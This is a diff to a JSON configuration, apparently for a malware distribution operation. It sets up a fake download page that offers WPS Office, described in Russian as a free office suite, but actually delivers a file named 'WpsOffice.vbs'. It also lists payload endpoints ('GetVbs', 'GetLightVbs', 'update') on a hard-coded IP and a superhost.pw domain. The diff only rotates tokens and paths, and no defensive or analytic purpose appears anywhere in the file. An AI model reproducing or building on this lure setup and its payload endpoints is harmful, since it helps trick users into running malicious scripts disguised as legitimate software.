@@ -4,20 +4,20 @@ $server = '{
                       {
                           "enabled":  true,
                           "id":  "ufiler.biz",
-                          "url":  "https://ufiler-pro2.ru/download/3974/?file={dn_url}\u0026poster=https://website-prod.cache.wpscdn.com/img/wps-office-free-all-in-one-office-suite.d880717.png\u0026size=10 ??.\u0026description=??????????????????? ???????? ????? ?? ????? ?????????\u0026theme=software\u0026title=WpsOffice.vbs"
+                          "url":  "https://ufiler-pro2.ru/download/3974/?file={dn_url}\u0026poster=https://website-prod.cache.wpscdn.com/img/wps-office-free-all-in-one-office-suite.d880717.png\u0026size=10 мб.\u0026description=Полнофункциональный оффисный пакет из Китая бесплатно\u0026theme=software\u0026title=WpsOffice.vbs"
                       }
                   ],
-    "phpTemplateFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\dn.php",
-    "phpTemplateSponsorFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\.\\download.php",
-    "htmlTemplateSponsorFile":  "C:\\Users\\Administrator\\source\\repos\\hephaestus\\php\\.\\download.html",
+    "phpTemplateFile":  "C:\\Users\\kgons\\source\\repos\\hephaestus\\php\\dn.php",
+    "phpTemplateSponsorFile":  "C:\\inetpub\\wwwroot\\php\\.\\download.php",
+    "htmlTemplateSponsorFile":  "C:\\inetpub\\wwwroot\\php\\.\\download.html",
     "UpdateFile":  null,
     "server":  "185.247.141.76",
     "strahServer":  null,
-    "dnVbsLinkShort":  "185.247.141.76/default/IbrUNBcRQB/none/GetVbs",
-    "dnVbsLink":  "http://0.superhost.pw/185.247.141.76/default/rSr601I6vw/none/GetVbs",
+    "dnVbsLinkShort":  "185.247.141.76/default/PKbGKY55Ls/none/GetVbs",
+    "dnVbsLink":  "http://0.superhost.pw/185.247.141.76/default/vpOqTd7gqa/none/GetVbs",
     "phpVbsLinkShort":  "185.247.141.76/default/GetVbsPhp",
-    "dnLightVbsLinkShort":  "185.247.141.76/default/EyMOjZ4yH6/none/GetLightVbs",
-    "dnLightVbsLink":  "http://0.superhost.pw/185.247.141.76/default/NvlNidhCt4/none/GetLightVbs",
+    "dnLightVbsLinkShort":  "185.247.141.76/default/PLTePQX9gj/none/GetLightVbs",
+    "dnLightVbsLink":  "http://0.superhost.pw/185.247.141.76/default/PL5ejTzaoR/none/GetLightVbs",
     "phpLightVbsLinkShort":  "185.247.141.76/default/GetLightVbsPhp",
     "updateUrl":  "http://0.superhost.pw/185.247.141.76/update",
     "primaryDns":  "185.247.141.78",
